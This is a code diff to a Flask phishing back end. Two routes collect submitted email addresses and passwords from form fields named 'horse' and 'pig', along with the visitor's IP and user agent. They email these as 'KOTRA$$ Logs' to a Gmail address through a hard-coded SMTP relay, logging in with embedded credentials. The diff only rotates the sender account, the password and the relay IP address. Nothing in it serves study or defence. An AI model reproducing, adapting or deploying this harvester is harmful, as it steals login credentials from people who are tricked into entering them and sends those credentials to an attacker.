@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@domainshieldtech.bio"
-        sender_emaill = "contact"
+        sender_email = "auto528@ecofuture.bio"
+        sender_emaill = "auto528"
         receiver_email = "danielnewwoj@gmail.com"
-        password = "vip6ebdd04ea6df"
+        password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("77.83.196.189", 6040) as server:
+        with smtplib.SMTP("62.106.66.84", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@domainshieldtech.bio"
-        sender_emaill = "contact"
+        sender_email = "auto528@ecofuture.bio"
+        sender_emaill = "auto528"
         receiver_email = "danielnewwoj@gmail.com"
-        password = "vip6ebdd04ea6df"
+        password = "vipb2b84382e351"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("77.83.196.189", 6040) as server:
+        with smtplib.SMTP("62.106.66.84", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
